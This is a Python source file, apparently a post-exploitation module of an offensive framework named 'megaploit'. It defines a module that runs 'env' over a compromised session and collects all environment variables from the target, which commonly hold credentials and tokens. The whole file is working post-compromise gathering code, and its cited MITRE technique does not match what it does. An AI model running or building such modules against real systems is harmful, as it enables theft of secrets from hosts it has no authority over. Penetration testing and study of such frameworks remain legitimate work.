"""megaploit.modules.post.multi.gather.env_dump — dump all environment variables."""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostEnvDump(AgentModule):
    name        = "post/multi/gather/env_dump"
    description = "Dump all environment variables from the target process"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = ["https://attack.mitre.org/techniques/T1083/"]
    platform    = ["windows", "linux", "macos"]
    arch        = []; rank = 400

    def _define_options(self) -> None:
        self._opt("SESSION", OptionType.INTEGER, required=True,
                  description="Session ID to target")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        out = self._send("env", sess)
        if out.strip():
            self._ok("Environment variables collected", output=out)
        else:
            self._fail("env returned empty output")
        return self.results

MODULE = PostEnvDump
